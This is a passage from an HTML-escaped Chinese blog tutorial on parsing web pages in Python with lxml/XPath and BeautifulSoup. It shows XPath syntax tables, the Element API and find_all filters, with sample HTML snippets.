                     +&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.*?integer&quot;&amp;gt;(.*?)&amp;lt;/i&amp;gt;.*?fraction&quot;&amp;gt;(.*?)&amp;lt;/i&amp;gt;.*?&amp;lt;/dd&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, re.S)
items &lt;/span&gt;= re.findall(pattern, html)
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;简介及安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;简介：&lt;/strong&gt;XPath 是一门在 XML 文档中查找信息的语言。XPath 可用来在 XML 文档中对元素和属性进行遍历。XPath 是 W3C XSLT 标准的主要元素，并且 XQuery 和 XPointer 都构建于 XPath 表达之上。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装：&lt;/strong&gt;pip install lxml&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调用方法：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 先导包&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; lxml &lt;span&gt;import&lt;/span&gt;&lt;span&gt; etree

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 将html文档或者xml文档转换成一个etree对象，然后调用对象中的方法查找指定的节点&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 1. 本地文件&lt;/span&gt;
tree =&lt;span&gt; etree.parse(文件名)
tree.xpath(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xpath表达式&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 2. 网络数据&lt;/span&gt;
tree =&lt;span&gt; etree.HTML(网页内容字符串)
tree.xpath(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xpath表达式&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;语法简介&lt;/h2&gt;
&lt;p&gt;先准备一个HTML格式的字符串&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('0c4a7645-a810-4df1-84e8-51fe2b57922e')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_0c4a7645-a810-4df1-84e8-51fe2b57922e&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_0c4a7645-a810-4df1-84e8-51fe2b57922e&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('0c4a7645-a810-4df1-84e8-51fe2b57922e',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_0c4a7645-a810-4df1-84e8-51fe2b57922e&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
html_doc = &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div class=&quot;d1&quot;&amp;gt;
    &amp;lt;div class=&quot;d2&quot;&amp;gt;
            &amp;lt;p class=&quot;story&quot;&amp;gt;
                &amp;lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,
                &amp;lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and
                &amp;lt;a href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;
            &amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;div&amp;gt;
        &amp;lt;p id=&quot;p1&quot;&amp;gt;人生苦短&amp;lt;/p&amp;gt;
        &amp;lt;p id=&quot;p2&quot;&amp;gt;我用python&amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;div class=&quot;d3&quot;&amp;gt;
    &amp;lt;a href=&quot;http://www.baidu.com&quot;&amp;gt;baidu&amp;lt;/a&amp;gt;
    &amp;lt;p&amp;gt;百度&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;变量准备&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;1，选取节点&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
nodename     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取nodename节点的所有子节点         xpath(‘//div’)         # 选取了所有div节点&lt;/span&gt;
/            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从根节点选取                        xpath(‘/div’)          # 从根节点上选取div节点&lt;/span&gt;
//           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取所有的当前节点，不考虑他们的位置    xpath(‘//div’)         # 选取所有的div节点&lt;/span&gt;
.            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点                        xpath(‘./div’)         # 选取当前节点下的div节点&lt;/span&gt;
..           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的父节点                 xpath(‘..’)            # 回到上一个节点&lt;/span&gt;
@            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取属性                           xpath（’//@calss’）     # 选取所有的class属性&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//div&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/div&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;./div&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@id='p1']&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//div[@class='d1']/div/p[@class='story']&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;2，谓语&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;表达式                                         结果
xpath(‘&lt;/span&gt;/body/div[1]’)                     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下的第一个div节点&lt;/span&gt;
xpath(‘/body/div[last()]’)                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下最后一个div节点&lt;/span&gt;
xpath(‘/body/div[last()-1]’)              &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下倒数第二个div节点&lt;/span&gt;
xpath(‘/body/div[positon()&amp;lt;3]’)           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下前两个div节点&lt;/span&gt;
xpath(‘/body/div[@&lt;span&gt;class&lt;/span&gt;]’)                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下带有class属性的div节点&lt;/span&gt;
xpath(‘/body/div[@&lt;span&gt;class&lt;/span&gt;=”main”]’)         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下class属性为main的div节点&lt;/span&gt;
xpath(‘/body/div[@price&amp;gt;35.00]’)          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下price元素值大于35的div节点&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']//a[2]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']//a[last()]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3，通配符&lt;/h3&gt;
&lt;p&gt;Xpath通过通配符来选取未知的XML元素&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;表达式                 结果
xpath（’&lt;/span&gt;/div/*’）     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取div下的所有子节点&lt;/span&gt;
xpath(‘/div[@*]’)    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取所有带属性的div节点&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']/*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']/a[@class]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;4，取多个路径&lt;/h3&gt;
&lt;p&gt;使用 “|” 运算符可以选取多个路径&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;表达式                         结果
xpath(‘&lt;/span&gt;//div|//table’)    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取所有的div和table节点&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']/a[@class]|//div[@class='d3']&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(ret)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;5，Xpath轴&lt;/h3&gt;
&lt;p&gt;轴可以定义相对于当前节点的节点集&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;轴名称                      表达式                                  描述
ancestor                xpath(‘.&lt;/span&gt;/ancestor::*’)              &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的所有先辈节点（父、祖父）&lt;/span&gt;
ancestor-&lt;span&gt;or&lt;/span&gt;-self        xpath(‘./ancestor-&lt;span&gt;or&lt;/span&gt;-self::*’)      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的所有先辈节点以及节点本身&lt;/span&gt;
attribute               xpath(‘./attribute::*’)             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的所有属性&lt;/span&gt;
child                   xpath(‘./child::*’)                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回当前节点的所有子节点&lt;/span&gt;
descendant              xpath(‘./descendant::*’)            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回当前节点的所有后代节点（子节点、孙节点）&lt;/span&gt;
following               xpath(‘./following::*’)             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取文档中当前节点结束标签后的所有节点&lt;/span&gt;
following-sibing        xpath(‘./following-sibing::*’)      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点之后的兄弟节点&lt;/span&gt;
parent                  xpath(‘./parent::*’)                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的父节点&lt;/span&gt;
preceding               xpath(‘./preceding::*’)             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取文档中当前节点开始标签前的所有节点&lt;/span&gt;&lt;span&gt;
preceding&lt;/span&gt;-sibling       xpath(‘./preceding-sibling::*’)     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点之前的兄弟节点&lt;/span&gt;
self                    xpath(‘./self::*’)                  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;6，功能函数&lt;/h3&gt;
&lt;p&gt;使用功能函数能够更好的进行模糊搜索&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;函数                  用法                                                               解释
starts&lt;/span&gt;-with         xpath(‘//div[starts-with(@id,”ma”)]‘)                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取id值以ma开头的div节点&lt;/span&gt;
contains            xpath(‘//div[contains(@id,”ma”)]‘)                           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取id值包含ma的div节点&lt;/span&gt;
&lt;span&gt;and&lt;/span&gt;                 xpath(‘//div[contains(@id,”ma”) &lt;span&gt;and&lt;/span&gt; contains(@id,”&lt;span&gt;in&lt;/span&gt;”)]‘)    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取id值包含ma和in的div节点&lt;/span&gt;
text()              xpath(‘//div[contains(text(),”ma”)]‘)                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取节点文本包含ma的div节点&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Element对象&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; lxml.etree &lt;span&gt;import&lt;/span&gt;&lt;span&gt; _Element
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; obj &lt;span&gt;in&lt;/span&gt;&lt;span&gt; ret:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(obj)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(type(obj))  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; from lxml.etree import _Element&lt;/span&gt;

&lt;span&gt;'''&lt;/span&gt;&lt;span&gt;
Element对象

class xml.etree.ElementTree.Element(tag, attrib={}, **extra)

　　tag：string，元素代表的数据种类。
　　text：string，元素的内容。
　　tail：string，元素的尾形。
　　attrib：dictionary，元素的属性字典。
　　
　　＃针对属性的操作
　　clear()：清空元素的后代、属性、text和tail也设置为None。
　　get(key, default=None)：获取key对应的属性值，如该属性不存在则返回default值。
　　items()：根据属性字典返回一个列表，列表元素为(key, value）。
　　keys()：返回包含所有元素属性键的列表。
　　set(key, value)：设置新的属性键与值。

　　＃针对后代的操作
　　append(subelement)：添加直系子元素。
　　extend(subelements)：增加一串元素对象作为子元素。＃python2.7新特性
　　find(match)：寻找第一个匹配子元素，匹配对象可以为tag或path。
　　findall(match)：寻找所有匹配子元素，匹配对象可以为tag或path。
　　findtext(match)：寻找第一个匹配子元素，返回其text值。匹配对象可以为tag或path。
　　insert(index, element)：在指定位置插入子元素。
　　iter(tag=None)：生成遍历当前元素所有后代或者给定tag的后代的迭代器。＃python2.7新特性
　　iterfind(match)：根据tag或path查找所有的后代。
　　itertext()：遍历所有后代并返回text值。
　　remove(subelement)：删除子元素。
&lt;/span&gt;&lt;span&gt;'''&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;简介及安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;简介：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。&lt;br/&gt;    它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装：&lt;/strong&gt;pip3 install beautifulsoup4&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解析器：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器，如果我们不安装它，则 Python 会使用 Python默认的解析器，lxml 解析器更加强大，速度更快&lt;strong&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://beautifulsoup.readthedocs.io/zh_CN/latest/&quot; target=&quot;_blank&quot;&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;简单使用&lt;/h2&gt;
&lt;p&gt;使用方式：可以将一个html文档，转化为BeautifulSoup对象，然后通过对象的方法或者属性去查找指定的节点内容&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; bs4 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BeautifulSoup

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 转化本地文件&lt;/span&gt;
soup = BeautifulSoup(open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;本地文件&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;), &lt;span&gt;'&lt;/span&gt;&lt;span&gt;lxml&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 转化网络文件&lt;/span&gt;
soup = BeautifulSoup(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;字符串类型或者字节类型&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;lxml&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从文档中获取所有文字内容:&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.get_text())
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;语法简介&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 1.根据标签名查找&lt;/span&gt;
    -&lt;span&gt; soup.a   只能找到第一个符合要求的标签
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 2.获取属性&lt;/span&gt;
    -&lt;span&gt; soup.a.attrs  获取a所有的属性和属性值，返回一个字典
    &lt;/span&gt;- soup.a.attrs[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]   获取href属性
    &lt;/span&gt;- soup.a[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]   也可简写为这种形式
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 3.获取内容&lt;/span&gt;
    -&lt;span&gt; soup.a.string
    &lt;/span&gt;-&lt;span&gt; soup.a.text
    &lt;/span&gt;-&lt;span&gt; soup.a.get_text()
   注意:如果标签还有标签，那么string获取到的结果为None，而其它两个，可以获取文本内容
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 4.find：找到第一个符合要求的标签&lt;/span&gt;
    - soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)  找到第一个符合要求的
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, title=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, alt=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, class_=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 5.find_all：找到所有符合要求的标签&lt;/span&gt;
    - soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find_all([&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]) 找到所有的a和b标签
    &lt;/span&gt;- soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, limit=2&lt;span&gt;)  限制前两个
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 6.根据选择器选择指定的内容&lt;/span&gt;
           select:soup.select(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#feng&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- 常见的选择器：标签选择器(a)、类选择器(.)、id选择器(&lt;span&gt;#&lt;/span&gt;&lt;span&gt;)、层级选择器&lt;/span&gt;
        -&lt;span&gt; 层级选择器：
            div .dudu &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;lala .meme .xixi  下面好多级&lt;/span&gt;
            div &amp;gt; p &amp;gt; a &amp;gt;&lt;span&gt; .lala          只能是下面一级
    注意:select选择器返回永远是列表，需要通过下标提取指定的对象&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;find_all()&lt;/h2&gt;
&lt;p&gt;先准备一个HTML格式的字符串&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('83c667d6-f18a-428e-a0b0-7b4e031fdb5c')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_83c667d6-f18a-428e-a0b0-7b4e031fdb5c&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_83c667d6-f18a-428e-a0b0-7b4e031fdb5c&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('83c667d6-f18a-428e-a0b0-7b4e031fdb5c',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_83c667d6-f18a-428e-a0b0-7b4e031fdb5c&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
html_doc = &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;p id=&quot;my p&quot; class=&quot;title&quot;&amp;gt;&amp;lt;b id=&quot;bbb&quot; class=&quot;boldest&quot;&amp;gt;The Dormouse's story&amp;lt;/b&amp;gt;
&amp;lt;/p&amp;gt;

&amp;lt;p class=&quot;story&quot;&amp;gt;Once upon a time there were three little sisters; and their names were
&amp;lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,
&amp;lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and
&amp;lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;;
and they lived at the bottom of a well.&amp;lt;/p&amp;gt;

&amp;lt;p class=&quot;story&quot;&amp;gt;...&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;变量准备&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;1，五种过滤器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;字符串、正则表达式、列表、True、方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; bs4 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BeautifulSoup
soup&lt;/span&gt;=BeautifulSoup(html_doc,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;lxml&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;1、字符串：即标签名&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;2、正则表达式&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; re
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.find_all(re.compile(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))) &lt;span&gt;#&lt;/span&gt;&lt;span&gt;找出b开头的标签，结果有body和b标签&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;3、列表：如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有&amp;lt;a&amp;gt;标签和&amp;lt;b&amp;gt;标签:&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all([&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]))

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;4、True：可以匹配任何值,下面代码查找到所有的tag,但是不会返回字符串节点&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(soup.find_all(True))
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; tag &lt;span&gt;in&lt;/span&gt;&lt;span&gt; soup.find_all(True):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.name)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;5、方法:如果没有合适过滤器,那么还可以定义一个方法,方法只接受一个元素参数 ,如果这个方法返回 True 表示当前元素匹配并且被找到,如果不是则反回 False&lt;/span&gt;
&lt;span&gt;def&lt;/span&gt;&lt;span&gt; has_class_but_no_id(tag):
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; tag.has_attr(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;and&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; tag.has_attr(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.find_all(has_class_but_no_id))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;2、按照类名查找&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;注意：关键字是class_，class_=value,value可以是五种选择器之一&lt;/p&gt;
